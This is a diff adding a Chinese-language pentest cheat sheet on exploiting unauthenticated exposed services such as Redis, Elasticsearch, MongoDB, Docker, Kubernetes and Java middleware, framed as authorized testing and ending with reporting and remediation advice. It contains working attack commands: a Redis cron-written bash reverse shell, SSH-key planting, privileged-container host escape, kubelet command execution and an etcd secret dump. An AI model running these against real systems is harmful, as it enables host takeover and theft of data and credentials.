@@ -1,0 +1,102 @@
+# 未授权访问服务全栈（公网暴露面）
+
+> SRC/攻防常见快速高危点：公网暴露的中间件/基础服务未授权 → 直接 RCE 或敏感数据。**遇到开放端口先手工验证未授权，再按服务打**。全部授权测试手法。
+
+## 0. 扫描与发现
+
+```
+nmap -p- <target> --open
+# 重点端口: 6379(Redis) 9200/9300(ES) 27017(Mongo) 2375/2376(Docker)
+#          6443(K8s) 10250(kubelet) 1099(RMI) 7001(WebLogic)
+#          8009(AJP) 4848/JMX 2181(ZK) 3306/1433/5432(DB) 9000(MiniO) 8848(Nacos)
+FOFA: title="Nacos" || body="Docker" || port="2375"（配合测绘）
+```
+
+**验证原则**：直接连 → 无认证回显 = 未授权；有认证 → 弱口令清单再试（默认/常见组合）；绝不爆破造成锁定。
+
+## 1. Redis (6379)
+
+```bash
+redis-cli -h <t> INFO            # 确认未授权（回显版本身份）
+redis-cli -h <t> CONFIG GET dir  # 看工作目录是否可写（crontab/SSH key 面）
+```
+利用链（授权评估，证明 get shell 即可不清数据）：
+- **写 crontab**（Linux root）：`SET x "\n\n*/1 * * * * bash -i >& /dev/tcp/...\n\n"` + `CONFIG SET dir /var/spool/cron` + `CONFIG SET dbfilename root` + `SAVE`
+- **写 SSH key**：`CONFIG SET dir /root/.ssh` + `dbfilename authorized_keys`（低权限用户面）
+- **主从复制 RCE**（4.x+）：`SLAVEOF` 到恶意服务器加载 .so 模块
+- **CVE-2026 系**：实时跟进 Redis 新 CVE
+
+## 2. Elasticsearch (9200)
+
+```bash
+curl http://<t>:9200/            # 未授权回显集群名
+curl .../9200/_cat/indices?v      # 列索引
+curl .../9200/<index>/_search?size=10   # 读数据
+curl .../9200/_cat/indices?v     # 敏感索引（user/order/log）
+```
+- 高危判定：拉到用户表/脱敏数据 → 高危（数据量级 + 敏感度定级）
+- 老版本 CVE：CVE-2015-1427（script 沙箱逃逸 RCE）、CVE-2019-7611 类
+
+## 3. MongoDB (27017)
+
+```bash
+mongo --host <t> --eval "db.adminCommand({listDatabases:1})"
+# 或: mongosh "mongodb://<t>:27017"
+```
+- 未授权 → 列出数据库 → 用户/业务数据（高危）
+- 老 CVE：CVE-2013-1892（Server-Side JavaScript RCE）
+
+## 4. Docker Engine API (2375/2376)
+
+```bash
+curl http://<t>:2375/version                    # 未授权确认
+curl http://<t>:2375/containers/json             # 列容器
+curl -XPOST http://<t>:2375/containers/create?... # 创建特权容器挂载宿主根 → host RCE
+# 直接 host 挂载: POST /containers/create 配置 Binds ["/:/mnt"] + Privileged:true
+```
+**影响**：docker 组/API 未授权 = 宿主 root（高危起）
+
+## 5. Kubernetes (6443) / Kubelet (10250) / etcd (2379)
+
+```bash
+# API server 未授权
+curl -k https://<t>:6443/api/v1/namespaces
+curl -k https://<t>:6443/api/v1/pods
+# → 创建特权 Pod 挂载 node 根目录 → node 逃逸（见云原生手册）
+
+# Kubelet 未授权
+curl -k https://<t>:10250/pods
+curl -k https://<t>:10250/run/<ns>/<pod>/<container>?cmd=id
+
+# etcd 未授权（存全集群密钥）
+ETCDCTL_API=3 etcdctl --endpoints=<t>:2379 get / --prefix
+```
+- 任一成立 = 集群接管（严重）
+
+## 6. Java 中间件面（老牌常客）
+
+| 服务 | 端口 | 打法 |
+|------|------|------|
+| WebLogic T3/IIOP | 7001 | 反序列化（CVE-2023-21839 等，T3 协议直接打） |
+| RMI Registry | 1099 | 反序列化攻击（需本地起 server 配合） |
+| AJP | 8009 | Ghostcat（CVE-2020-1938）：读任意文件/WEB-INF 源码 |
+| JMX | 1099/4848/8686 | RMI 反序列化 / 未授权 MBean 操作 |
+| Nacos | 8848 | 未授权配置读取、`/nacos/v1/auth/users` 弱口令、namespace 越权 |
+
+## 7. 其他常见面
+
+| 服务 | 端口 | 打法 |
+|------|------|------|
+| Jenkins | 8080 | 未授权脚本控制台 RCE（`/script`） |
+| Hadoop YARN | 8088 | REST API 未授权提交应用 → RCE |
+| ZooKeeper | 2181 | `dump` 未授权（配置/会话泄露） |
+| MinIO | 9000 | 未授权 ListBuckets（配合认钥闸） |
+| CouchDB | 5984 | 未授权 + `_users` 读 |
+| Memcached | 11211 | `stats` 泄露、UDP 放大 |
+| PostgreSQL/MySQL/MSSQL | 5432/3306/1433 | 弱口令清单（不爆破）；MSSQL xp_cmdshell |
+
+## 8. 取证与报告
+- 未授权访问**读数据前先记录基线**（索引/库列表 → 才谈读）——差分即证据
+- 数据读取最小化：证明存在敏感数据即可（表名+条数+样例脱敏），不整库拖
+- 定级：能拿全量用户数据/云凭证 → 严重；仅配置泄露 → 中危
+- 修复建议：绑定内网/加认证（密码/证书/TLS）/按最小权限暴露/云安全组收敛
